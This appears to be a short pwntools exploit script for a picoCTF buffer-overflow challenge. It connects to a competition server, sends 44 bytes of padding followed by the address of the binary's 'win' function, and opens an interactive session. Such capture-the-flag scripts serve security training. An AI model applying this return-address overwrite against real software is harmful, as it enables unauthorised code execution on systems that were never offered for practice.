from pwn import *

# r = process("./vuln")
r = remote("saturn.picoctf.net", 54621)
exe = ELF("./vuln")

r.recvline()
payload = b"".ljust(44) + p32(exe.sym['win'])
r.sendline(payload)
r.interactive()